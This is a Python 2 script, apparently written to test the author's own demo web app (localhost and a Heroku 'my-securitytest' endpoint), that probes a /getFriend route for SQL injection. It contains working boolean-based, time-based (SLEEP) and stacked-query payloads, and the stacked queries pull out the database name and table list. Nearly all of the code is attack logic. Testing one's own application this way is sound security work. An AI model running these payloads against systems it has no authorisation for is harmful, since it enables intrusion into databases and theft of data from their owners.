import os
import sys
import urllib2
import httplib
import json as js
# from datetime import datetime
import time


def check_boolean_based_attack(url):
    arr = ["'%20OR%20'1'%20=%20'1';%20--%20", "\"%20OR%20'1'%20=%20'1';%20--%20", "%20OR%20'1'%20=%20'1';%20--%20"]
    for e in arr:
        opener = urllib2.build_opener()
        f = opener.open(url + e)
        if f.getcode() == 200:
            res = js.loads(f.read())
            print "This web server is vulnerable for boolean based attack."
            print "The response after boolean attack is:"
            print res
            print
            break


def check_stack_query(url):
    req = url + "'%3B%20SELECT%20DATABASE()%3B%20--%20"
    opener = urllib2.build_opener()
    f = opener.open(req)
    database = js.loads(f.read())
    print "This web server is vulnerable for Stacked Queries(Piggy Backing)."
    print "The Database's name is: "
    print database[1][0]['DATABASE()'] + "\n"

    req = url + "'%3B%20SHOW%20TABLES%3B%20--%20"
    f = opener.open(req)
    tables = js.loads(f.read())
    print "The tables in this database are: "
    for table in tables[1]:
        print table.values()[0]
    print


def check_time_based_attack(url):
    arr = ["'%20AND%20SLEEP(15);%20--%20", "\"%20AND%20SLEEP(15);%20--%20", "%20AND%20SLEEP(15);%20--%20"]
    for e in arr:
        a = time.time()
        opener = urllib2.build_opener()
        f = opener.open(url + e)
        b = time.time()
        duration = b - a
        if duration > 13:
            print "This web server is vulnerable for time based attack."
            print "The response time after boolean attack SLEEP(15) is: " + str(duration) + "\n"


def check_if_database_error_exposed(str):
    newStr = str + "%3B%20Select%20*%20from%20aasdafasflkdsajfdsauoiewanklrjfjdalskjf%20"
    print(newStr)
    contents = urllib2.urlopen(newStr)
    print(contents.read())
    print(contents.getcode())


online = "https://my-securitytest.herokuapp.com/getFriend/user1"
local = "http://localhost:3000/getFriend/user1"

check_boolean_based_attack(local)
check_time_based_attack(local)
check_stack_query(local)

# #
#
# check_stack_query(origin)

# print json[0]['title']
# # a = booleanattack("https://lit-garden-23003.herokuapp.com/getFriend/user1")
# # print(a)
#
# check_if_database_error_exposed(origin)

# contents = urllib2.urlopen(a)
# print(contents.read())
# print contents.getcode()

# b = check_multiple_query(origin)
# print(b)
# contents2 = urllib2.urlopen(b)
# print(contents2.read())
# print contents2.getcode()
# check_multiple_query(origin)
#
# localhost:3000/getFriend/user1'; SELECT DATABASE(); --%20
# localhost:3000/getFriend/user1'; SHOW TABLES; --%20

#
# commands = {
#     'command1': ex1.check_stack_query,
#     'command2': ex1.check_if_database_error_exposed
# }
#
# if __name__ == '__main__':
#     command = os.path.basename(sys.argv[0])
#     if command in commands:
#         commands[command](*sys.argv[1:])
